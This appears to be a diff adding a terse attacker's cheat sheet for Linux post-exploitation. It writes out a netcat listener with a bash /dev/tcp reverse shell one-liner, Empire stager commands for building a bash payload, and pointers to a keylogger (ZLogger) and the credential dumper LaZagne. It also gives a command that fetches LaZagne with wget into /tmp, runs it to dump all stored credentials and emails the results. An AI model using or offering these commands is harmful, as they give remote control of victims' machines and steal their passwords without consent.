@@ -1,0 +1,22 @@
+Reverse shell with one command: netcat
+    on host:    $ nc -nvlp <port>
+    on target:  $ bash -i >& /dev/tcp/<host ip>/<port>  0>&1
+
+
+Empire
+    usestager multi/bash 
+    set Listener http
+    set OutFile linux_bash_shell_empire
+    execute
+
+ZLogger 
+    works the same as for windows (compile for linux - its best to compile on the exact same linux distro)
+
+LazaGne
+    works the same as for windows (just download/compile for linux)
+
+Execute and report (via email)
+    https://github.com/z00z/ZReporter
+
+    use shell COMMAND: cd /tmp/ && wget -q <direct url to LazaGne> && chmod +x Lazagne && ./LazaGne all 
+
